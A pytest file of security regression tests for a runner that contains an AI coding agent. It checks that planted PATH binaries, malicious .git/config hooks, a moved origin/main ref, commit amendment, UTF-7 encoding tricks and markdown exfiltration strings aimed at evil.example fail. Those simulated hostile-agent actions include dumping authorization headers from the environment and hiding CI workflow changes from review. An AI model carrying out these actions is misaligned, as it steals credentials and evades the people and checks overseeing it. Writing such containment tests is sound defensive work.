"""Security audit non-regression from 13/11/2026: one test per fixed vulnerability (C1 to C11)."""
import json, os, socket, subprocess, threading
import httpx
import pytest
from sqlalchemy import select
from app import auth, db, jobs, notify, work
from runner import config as rconf
from runner import executor, gateway
from .conftest import ADMIN, REQ, REVIEWER
from .test_runner import _drop_recipe, _git, _new_repo, setup, step  # noqa: F401  (fixture)
from .test_work import _policy, _to_pr, api, runner  # noqa: F401  (fixture)


def _plant(path, body):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    open(path, "w").write(body)
    os.chmod(path, 0o755)


# ---------- C1 / C2: nothing from the workspace runs in the runner, and the token never passes through it ----------

def test_setpriv_is_called_by_absolute_path(monkeypatch):
    monkeypatch.setattr(rconf, "AGENT_UID", "10002")
    assert executor.as_agent()[0] == "/usr/bin/setpriv"


def test_job_home_and_repo_config_never_run_in_the_runner(setup, repo, tmp_path):
    r, forge, panel = setup
    ref = jobs.create(REQ, "Réparer", "B", "", repo)
    marker = tmp_path / "pwned"
    real = r.agent

    def hostile_agent(ctx, *a, **k):
        res = real(ctx, *a, **k)
        evil = f"#!/bin/sh\necho \"$0 $*\" >> {marker}\nenv | grep -i authorization >> {marker}\nexit 0\n"
        # C1: programs that the RUNNER launches (git, setpriv, rm...) placed in the job's PATH. (The recipe commands, however,
        # run on the job side with the agent's rights: this is not the object of the test.)
        for p in ("go/bin/git", "go/bin/setpriv", ".local/bin/git", ".local/bin/rm", ".local/bin/mkdir"):
            _plant(os.path.join(ctx.home, p), evil)
        _plant(os.path.join(ctx.home, "hook.sh"), evil)
        with open(os.path.join(ctx.repo_dir, ".git", "config"), "a") as f:                               # C2 : .git/config
            f.write(f"[core]\n\tfsmonitor = {ctx.home}/hook.sh\n\tsshCommand = {ctx.home}/hook.sh\n"
                    f"[remote \"origin\"]\n\tpushurl = ssh://h.invalid/o/r.git\n\treceivepack = {ctx.home}/hook.sh\n"
                    f"[diff]\n\texternal = {ctx.home}/hook.sh\n[push]\n\tfollowTags = true\n")
        open(os.path.join(ctx.home, ".gitconfig"), "w").write(f"[core]\n\tfsmonitor = {ctx.home}/hook.sh\n")
        return res
    r.agent = hostile_agent
    step(r, panel)
    j = jobs.get(ADMIN, ref)
    assert j["stage"] == "pr", j["events"][-3:]
    assert not marker.exists(), marker.read_text()
    pushed = subprocess.run(["git", "rev-parse", f"refs/heads/{j['branch']}"], cwd=forge.bare, capture_output=True, text=True).stdout.strip()
    assert pushed and pushed.startswith(j["verified_sha"])                    # pushed from the mirror, to the Git host, at the verified sha


# ---------- C7: the base of the diffs comes from the Git host, not from a workspace reference ----------

def test_agent_moving_origin_ref_cannot_hide_changes(setup, repo):
    r, forge, panel = setup
    ref = jobs.create(REQ, "Réparer", "B", "", repo)
    real = r.agent

    def sneaky_agent(ctx, *a, **k):
        res = real(ctx, *a, **k)
        w = ctx.repo_dir
        _git("add", "-A", cwd=w); _git("commit", "-qm", "travail", "--allow-empty", cwd=w)
        os.makedirs(os.path.join(w, ".forgejo", "workflows"), exist_ok=True)
        open(os.path.join(w, ".forgejo", "workflows", "ci.yml"), "w").write("on: push\n")
        _git("add", "-A", cwd=w); _git("commit", "-qm", "caché", cwd=w)
        _git("update-ref", "refs/remotes/origin/main", "HEAD", cwd=w)   # the agent moves "origin/main" to its commit
        open(os.path.join(w, "notebook.py"), "a").write("# visible\n")
        return res
    r.agent = sneaky_agent
    step(r, panel)
    j = jobs.get(ADMIN, ref)
    assert ".forgejo/workflows/ci.yml" in j["diff"]["files"]
    assert not {l["name"]: l["ok"] for l in j["decision"]["limits"]}["Protected paths"]


# ---------- C6 / C10: onboarding only pushes the recipe, as committed ----------

def test_onboarding_replay_cannot_rewrite_the_recipe_commit(setup, tmp_path):
    r, forge, panel = setup
    _drop_recipe(forge, tmp_path)
    rid = _new_repo("alice/amende")
    ref = jobs.onboard(ADMIN, rid)
    real = r.agent

    def amending_agent(ctx, *a, **k):
        res = real(ctx, *a, **k)
        amend = ("printf 'planted = 1\\n' >> notebook.py && git add notebook.py && "
                 "git -c user.name=a -c user.email=a@a commit -q --amend --no-edit")
        recipe = {"setup": [amend], "checks": {"tests": "true"}}
        open(os.path.join(ctx.repo_dir, ".fabrique", "setup.json"), "w").write(json.dumps(recipe))
        return res
    r.agent = amending_agent
    step(r, panel)
    j = jobs.get(ADMIN, ref)
    assert j["stage"] == "failed" and "changed the onboarding commit" in str(j), [(k, v) for k, v in j.items() if isinstance(v, str)]
    assert not subprocess.run(["git", "rev-parse", "--verify", "-q", f"refs/heads/{j['branch']}"], cwd=forge.bare,
                              capture_output=True).stdout.strip()                       # nothing has been pushed


def test_onboarding_recipe_reported_is_the_committed_blob(setup, tmp_path):
    r, forge, panel = setup
    _drop_recipe(forge, tmp_path)
    rid = _new_repo("alice/encodage")
    ref = jobs.onboard(ADMIN, rid)
    real = r.agent

    def encoding_agent(ctx, *a, **k):
        res = real(ctx, *a, **k)
        open(os.path.join(ctx.repo_dir, ".gitattributes"), "w").write(".fabrique/setup.json working-tree-encoding=UTF-7\n")
        open(os.path.join(ctx.repo_dir, ".fabrique", "setup.json"), "w").write(
            '{"setup": [], "checks": {"tests": "echo ok+ACI-, +ACI-evil+ACI-: +ACI-true"}}')
        return res
    r.agent = encoding_agent
    step(r, panel)
    j = jobs.get(ADMIN, ref)
    if j["stage"] != "pr":
        return                                                                          # refusal: acceptable too
    blob = subprocess.run(["git", "show", f"refs/heads/{j['branch']}:.fabrique/setup.json"], cwd=forge.bare, capture_output=True, text=True).stdout
    with db.tx() as c:
        shown = db.one(c, select(db.repos).where(db.repos.c.id == rid))["recipe"]
    assert shown["checks"] == json.loads(blob)["checks"]                                # what is displayed = what is committed


# ---------- C4: non-raw paths = protected ----------

@pytest.mark.parametrize("path", ['"\\.forgejo/workflows/d\\303\\251ploie.yml"', "{docs => .forgejo/workflows}/evil.yml",
                                  "docs/a => Dockerfile", "app/{x => auth}/f.py"])
def test_protected_gate_fails_closed_on_display_paths(path):
    assert work.protected_hits([path, "app/ok.py"], [".forgejo/**", "Dockerfile", "**/auth/**"]) == [path]


# ---------- C9 : a requested stop prevents an automatic merge ----------

def test_cancel_request_blocks_automerge(runner, repo):  # noqa: F811
    _policy(repo, "confident")
    ref = jobs.create(REQ, "T", "B", "", repo)
    a = api(runner)
    # the job is taken, then a reviewer requests the stop before the PR arrives
    from sqlalchemy import update
    with db.tx() as c:
        jid = db.one(c, select(db.jobs.c.id).where(db.jobs.c.ref == ref))["id"]
        c.execute(update(db.intents).where(db.intents.c.job_id != jid).values(state="done"))
    assert a.post("/api/runner/claim").json()["job"]["ref"] == ref
    jobs.cancel(REVIEWER, ref)
    a.post(f"/api/runner/jobs/{ref}/event", json={"type": "decision", "confident": True, "verdict": "v", "interpretation": "i"})
    a.post(f"/api/runner/jobs/{ref}/event", json={"type": "evidence", "sha": "abcdef1234567", "checks": [
        {"name": "Tests", "command": "pytest", "ok": True, "duration_ms": 10, "output": "ok"}]})
    for role in ("code", "security"):
        a.post(f"/api/runner/jobs/{ref}/event", json={"type": "review", "sha": "abcdef1234567", "role": role, "verdict": "ok", "summary": "s"})
    a.post(f"/api/runner/jobs/{ref}/event", json={"type": "pr", "number": 7, "url": "https://git.test/x/pulls/7",
                                                  "files": ["a.py"], "additions": 3, "deletions": 0, "attempts": 1})
    with db.tx() as c:
        kinds = [i["kind"] for i in db.rows(c, select(db.intents).where(db.intents.c.job_id == jid))]
    assert "merge" not in kinds and jobs.get(ADMIN, ref)["merge_state"] != "approved"


# ---------- C3 : a group or fallback role does not survive its source ----------

def test_group_and_breakglass_roles_are_revoked_with_their_source():
    cf = {"admin_groups": ["fab-admins"], "reviewer_groups": [], "requester_groups": []}
    assert auth.role_for("carla", "", [], {"role": "admin", "role_source": "groupe fab-admins"}, cf)[0] == "requester"
    assert auth.role_for("eve", "", [], {"role": "admin", "role_source": "break-glass (FABRIQUE_ADMINS)"}, cf)[0] == "requester"
    assert auth.role_for("vera", "", [], {"role": "reviewer", "role_source": "dashboard"}, cf) == ("reviewer", "dashboard")
    assert auth.role_for("rémi", "", [], {"role": "requester", "role_source": "défaut des nouveaux comptes"}, cf)[0] == "requester"


# ---------- C5 : the gateway counts and caps the spend, and only opens useful entry points ----------

class Ctx:
    ref = "FAB-1"

    def __init__(self, budget=0.5):
        self.model = {"id": "claude-haiku-4-5", "provider": "anthropic", "type": "anthropic", "key": "sk-DUMMY"}
        self.budget, self.base_cost, self.gw_spent, self.gw_mark = budget, 0.0, 0.0, 0.0


def test_gateway_meters_spend_enforces_budget_and_paths():
    calls = []

    def upstream(req):
        calls.append(str(req.url))
        return httpx.Response(200, json={"usage": {"input_tokens": 100000, "output_tokens": 50000}})
    ctx = Ctx(budget=0.5)
    s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
    gw = gateway.Gateway({"tok": ctx}.get, port, "127.0.0.1", transport=httpx.MockTransport(upstream))
    gw.serve()
    url = f"http://127.0.0.1:{port}"
    assert httpx.post(url + "/m/v1/models", headers={"x-api-key": "tok"}).status_code == 403          # unauthorized path
    assert httpx.post(url + "/m/v1/messages", headers={"x-api-key": "tok"}, json={"model": "claude-opus-5-5"}).status_code == 200
    assert ctx.gw_spent > 0.5                                                                         # measured at the rate of the requested model
    assert httpx.post(url + "/m/v1/messages", headers={"x-api-key": "tok"}, json={"model": "claude-opus-5-5"}).status_code == 402
    assert len(calls) == 1
    gw.server.shutdown()


# ---------- C8 : the Jira ticket comes from the title, never from the agent text ----------

def test_jira_issue_is_never_chosen_by_agent_text():
    p = notify.message("question", job={"ref": "FAB-7", "title": "Ajouter un export"}, detail="voir OPS-4242 urgent")
    assert notify._jira_key("OPS", p) == ""
    p = notify.message("question", job={"ref": "FAB-7", "title": "OPS-7 Ajouter un export"}, detail="voir OPS-4242")
    assert notify._jira_key("OPS", p) == "OPS-7"


def test_runner_git_uses_a_runner_written_global_config(tmp_path, monkeypatch):
    """Git subprocesses (upload-pack from a local clone) do not receive GIT_CONFIG_* : the global configuration
    written by the runner carries safe.directory, otherwise the agent cannot clone the runner mirror (seen in FAB-277)."""
    from runner import main as rmain
    monkeypatch.setattr(rconf, "WORK_DIR", str(tmp_path))
    rmain.write_global_config()
    env = rmain.git_env()
    assert env["GIT_CONFIG_GLOBAL"] == str(tmp_path / ".mirrors" / "gitconfig")
    assert "directory = *" in open(env["GIT_CONFIG_GLOBAL"]).read()


# ---------- run-2 : the agent text is inert for third parties (PR, comments, Teams, Jira) ----------

HOSTILE = "Closes #1 et Closes org/autre#2 @victime ![x](https://evil.example/b.png?d=SECRET) <img src=x> https://evil.example/login"


def test_agent_text_is_inert_in_pr_body_and_titles(setup, repo):
    from runner import messages
    r, forge, panel = setup
    ref = jobs.create(REQ, "Réparer\nCloses #9", "B @quelquun", "", repo)
    real = r.agent

    def chatty_agent(ctx, *a, **k):
        res = real(ctx, *a, **k)
        ctx.decision = dict(ctx.decision or {}, verdict=HOSTILE, interpretation=HOSTILE * 400)
        return res
    r.agent = chatty_agent
    step(r, panel)
    pr = forge.prs[1]
    for bad in ("#1", "#2", "#9", "@victime", "@quelquun", "![x](", "<img", "https://evil"):   # broken active syntaxes
        assert bad not in pr["body"], bad
    assert "\n" not in pr["title"] and "#9" not in pr["title"]
    assert len(pr["body"]) < 16000                                            # bounded opinion (1000 + 4000), not 400 copies
    assert messages.inert("a@b #1 ![i](u) x://y") == "a@\u200bb #\u200b1 !\u200b[i]\u200b(u) x:\u200b//y"


def test_relay_bounds_agent_decision_fields():
    from runner.relay import Relay

    class P:
        def event(self, ref, **k):
            self.last = k

    class C:
        ref, stages, decision = "FAB-1", set(), None
    p = P()
    rl = Relay(p, 0)
    tok = rl.register(C)
    rl.handle(tok, {"cmd": "decision", "confident": "yes", "verdict": "v" * 5000, "interpretation": {"x": 1}, "notes": None})
    d = C.decision
    assert d["confident"] is True and len(d["verdict"]) == 1000 and isinstance(d["interpretation"], str) and d["notes"] is None


def test_notifications_escape_agent_text_per_channel():
    assert "[lien](" not in notify.teams_text("[lien](https://evil.example) **gras**") and "\\[" in notify.teams_text("[a](b)")
    j = notify.jira_text("[~admin] !https://evil.example/b.png! {noformat} [a|https://e]")
    assert j.startswith("{noformat}\n") and j.endswith("\n{noformat}") and j.count("{noformat}") == 2


def test_forgejo_adopts_only_its_own_repo_pr():
    from runner import forge as F

    def handler(req):
        if req.method == "POST":
            return httpx.Response(409, json={})
        if req.method == "GET":
            return httpx.Response(200, json=[{"number": 99, "head": {"ref": "fabrique/FAB-1", "repo": {"full_name": "mallory/app"}}},
                                             {"number": 7, "head": {"ref": "fabrique/FAB-1", "repo": {"full_name": "org/app"}}}])
        assert req.url.path.endswith("/pulls/7")
        return httpx.Response(200, json={})
    g = F.Forgejo(base="https://git.example", token="t", transport=httpx.MockTransport(handler))
    assert g.open_pr("org/app", "fabrique/FAB-1", "main", "t", "b") == 7
